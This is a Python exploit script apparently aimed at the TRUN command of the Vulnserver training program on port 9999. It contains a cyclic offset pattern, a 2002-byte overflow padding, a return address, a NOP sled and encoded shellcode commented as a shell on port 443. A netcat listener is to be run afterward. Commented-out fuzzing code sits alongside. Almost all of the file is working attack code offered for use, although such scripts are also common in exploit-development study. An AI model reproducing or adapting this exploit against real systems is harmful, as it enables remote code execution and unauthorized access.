#use netcat after run
import socket

s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
#shellcode Shellport443
badbois = ("\xdb\xd3\xbd\xa7\x17\xaf\x98\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x68\x17\x03\x68\x17\x83\x4f\xeb\x4d\x6d\x73\xfc\x10"
"\x8e\x8b\xfd\x74\x06\x6e\xcc\xb4\x7c\xfb\x7f\x05\xf6\xa9\x73"
"\xee\x5a\x59\x07\x82\x72\x6e\xa0\x29\xa5\x41\x31\x01\x95\xc0"
"\xb1\x58\xca\x22\x8b\x92\x1f\x23\xcc\xcf\xd2\x71\x85\x84\x41"
"\x65\xa2\xd1\x59\x0e\xf8\xf4\xd9\xf3\x49\xf6\xc8\xa2\xc2\xa1"
"\xca\x45\x06\xda\x42\x5d\x4b\xe7\x1d\xd6\xbf\x93\x9f\x3e\x8e"
"\x5c\x33\x7f\x3e\xaf\x4d\xb8\xf9\x50\x38\xb0\xf9\xed\x3b\x07"
"\x83\x29\xc9\x93\x23\xb9\x69\x7f\xd5\x6e\xef\xf4\xd9\xdb\x7b"
"\x52\xfe\xda\xa8\xe9\xfa\x57\x4f\x3d\x8b\x2c\x74\x99\xd7\xf7"
"\x15\xb8\xbd\x56\x29\xda\x1d\x06\x8f\x91\xb0\x53\xa2\xf8\xdc"
"\x90\x8f\x02\x1d\xbf\x98\x71\x2f\x60\x33\x1d\x03\xe9\x9d\xda"
"\x64\xc0\x5a\x74\x9b\xeb\x9a\x5d\x58\xbf\xca\xf5\x49\xc0\x80"
"\x05\x75\x15\x06\x55\xd9\xc6\xe7\x05\x99\xb6\x8f\x4f\x16\xe8"
"\xb0\x70\xfc\x81\x5b\x8b\x97\x6d\x33\xf7\x62\x06\x46\xf7\x6d"
"\x6d\xcf\x11\x07\x81\x86\x8a\xb0\x38\x83\x40\x20\xc4\x19\x2d"
"\x62\x4e\xae\xd2\x2d\xa7\xdb\xc0\xda\x47\x96\xba\x4d\x57\x0c"
"\xd2\x12\xca\xcb\x22\x5c\xf7\x43\x75\x09\xc9\x9d\x13\xa7\x70"
"\x34\x01\x3a\xe4\x7f\x81\xe1\xd5\x7e\x08\x67\x61\xa5\x1a\xb1"
"\x6a\xe1\x4e\x6d\x3d\xbf\x38\xcb\x97\x71\x92\x85\x44\xd8\x72"
"\x53\xa7\xdb\x04\x5c\xe2\xad\xe8\xed\x5b\xe8\x17\xc1\x0b\xfc"
"\x60\x3f\xac\x03\xbb\xfb\xdc\x49\xe1\xaa\x74\x14\x70\xef\x18"
"\xa7\xaf\x2c\x25\x24\x45\xcd\xd2\x34\x2c\xc8\x9f\xf2\xdd\xa0"
"\xb0\x96\xe1\x17\xb0\xb2")

#2300 ptn
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy"

buffer = ("A" * 2002 + "\xC3\xC1\x5D\x77" + "\x90"*8 + badbois)

#buffer-overflow at 2002
#buffer = ("A" *2002 + "B"*4 + "C" * (2300-2002-4))
'''
while counter <= 6000:
	counter = counter+200
	print("Fuzzing TRUN with %s bytes" %counter)
	buffer = ("TRUN / .:/" + "A" * counter)
'''
try:
	print(">>>>>.SENDIND EVIL.<<<<<")
	#your ip address
	s.connect(("IP add",9999))
	s.send("TRUN /.:/ "+buffer)
	print (">>>>>>..DONE..<<<<<<")
except:
	print("CONNECTION FAIL")

